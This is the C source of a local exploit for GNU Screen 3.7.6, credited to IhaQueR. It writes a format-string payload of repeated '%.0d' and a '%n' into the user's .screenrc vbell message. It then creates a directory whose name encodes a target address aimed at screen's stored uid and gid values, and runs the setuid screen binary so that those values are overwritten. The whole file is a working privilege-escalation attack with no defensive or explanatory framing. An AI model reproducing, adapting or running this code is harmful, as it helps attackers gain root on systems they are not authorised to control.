/****************************************************************
*
*
*  Screen 3.7.6 (and others) local
exploit                                                                *

*  by
IhaQueR@IRCnet
*
*
*
****************************************************************/



#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>



#define TMPBUFSIZE 4096

#define SCREENRC "/usr/home/paul/.screenrc"
#define SCREEN "/usr/bin/screen"

#define AREP 1
#define BUFOFFSET 324
#define PADDING 3
#define WRITEADDR 0x807beb4


//  some offsets grabbed from 3.7.6
//  &real_uid, &real_gid, &eff_uid, &eff_gid own_uid
//  0x807beb4 0x807ab1c 0x807aab0 0x807aab4 0x807bea4
//  + 64  +64



int main(int argc, char** argv)
{
int i, l;
FILE* fp;
char buf[TMPBUFSIZE];
unsigned char adr[(AREP+2)*sizeof(unsigned)];
unsigned char* cp;
unsigned a, *p;


  if(argc != 2) {
   printf("USAGE %s offset\n", argv[0]);
   return 0;
  }

  l = atoi(argv[1]);
  printf("creating magic string\n");

  bzero(buf, TMPBUFSIZE);

/*  consume stack arguments */
  for(i=0; i<BUFOFFSET/4; i++)
   strcat(buf, "%.0d");

/*  finally write to adress */
//  for(i=0;i<9; i++)
   strcat(buf, "%n");

  if(fp = fopen(SCREENRC, "w")) {
   fprintf(fp, "vbell on\n");
   fprintf(fp, "vbell_msg '%s'\n", buf);
   fprintf(fp, "vbellwait 11111\n");
   fclose(fp);
  }
  else {
   printf("ERROR: opening %s\n", SCREENRC);
  }

/*  now create the magic dir... */
  bzero(adr, (AREP+2)*sizeof(unsigned));
  cp = adr;
  for(i=0; i<PADDING; i++) {
   *cp = 'p';
   cp++;
  }

  p = (unsigned*) cp;

  a = WRITEADDR;
  a = a + l;

  for(i=0; i<AREP; i++) {
   *p = a;
//   a += 4;
   p++;
  }

  *p = 0;

/* make dir and call screen */
  mkdir((char*)adr, 0x777);
  chdir((char*)adr);
  argv[1] = NULL;
  execv(SCREEN, argv);
}

